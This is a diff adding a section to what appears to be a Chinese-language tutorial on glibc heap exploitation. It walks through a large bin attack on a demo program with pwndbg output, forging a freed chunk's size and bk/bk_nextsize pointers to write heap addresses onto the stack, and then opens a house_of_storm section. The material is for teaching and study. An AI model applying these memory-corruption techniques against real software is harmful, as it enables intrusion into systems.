@@ -1545,6 +1545,136 @@ int main()
     return 0;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<ul>
+<li>向栈中写入数据，可用于修改<code>global_max_fast</code></li>
+</ul>
+<p>创建一个<code>large bin</code>之后再创建一个<code>fast bin</code>防止释放的时候合并掉</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x431
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405430
+Size: 0x31
+
+Top chunk | PREV_INUSE
+Addr: 0x405460
+Size: 0x20ba1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>创建两个大小相同且与大于第一个大小的<code>large bin</code>且每个<code>large bin</code>下面都创建一个<code>fast bin</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x431
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405430
+Size: 0x31
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405460
+Size: 0x511
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405970
+Size: 0x31
+
+Allocated chunk | PREV_INUSE
+Addr: 0x4059a0
+Size: 0x511
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405eb0
+Size: 0x31
+
+Top chunk | PREV_INUSE
+Addr: 0x405ee0
+Size: 0x20121<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将第一、二两个堆释放进<code>unsorted bin</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x405460 —▸ 0x405000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;
+smallbins
+empty
+largebins
+empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>创建一个比第一个释放的堆小的堆使得<strong>第二个</strong>被释放的堆进入<code>large bin</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4050a0
+smallbins
+empty
+largebins
+0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将第三个堆也释放到<code>unsorted bin</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x4059a0 —▸ 0x4050a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x4059a0
+smallbins
+empty
+largebins
+0x500: 0x405460 —▸ 0x7ffff7dd1fa8 (main_arena+1160) ◂— 0x405460 &#x2F;* &#39;&#96;T@&#39; *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>修改第二个被释放的堆的一些内容</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x405460
+0x405460:	0x0000000000000000	0x00000000000003f1			#减小第二个堆的大小使得第三个堆进入large bin链表
+0x405470:	0x0000000000000000	0x00007fffffffdd50			#将想要写入的栈地址写入bk、bk_nextsize,其中bk位置的地址要减0x10，bk_nextsize的地址要减0x20
+0x405480:	0x0000000000000000	0x00007fffffffdd48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>创建一个<code>fast bin</code>使得第三个堆进入<code>unsorted bin</code>，此时栈上的内容也会被修改为第三个堆的头指针</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x405140 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405140 &#x2F;* &#39;@Q@&#39; *&#x2F;
+smallbins
+empty
+largebins
+0x500 [corrupted]
+FD: 0x405460 ◂— 0x0
+BK: 0x405460 —▸ 0x4059a0 —▸ 0x7fffffffdd50 ◂— 0x4059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;gx 0x7fffffffdd60
+0x7fffffffdd60:	0x00000000004059a0
+pwndbg&gt; x&#x2F;gx 0x7fffffffdd68
+0x7fffffffdd68:	0x00000000004059a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h1 id="house-of-storm-x2F-unsorted-bin-attack-large-bin-attack"><a href="#house-of-storm-x2F-unsorted-bin-attack-large-bin-attack" class="headerlink" title="house_of_storm&#x2F;unsorted bin attack + large bin attack"></a>house_of_storm&#x2F;unsorted bin attack + large bin attack</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
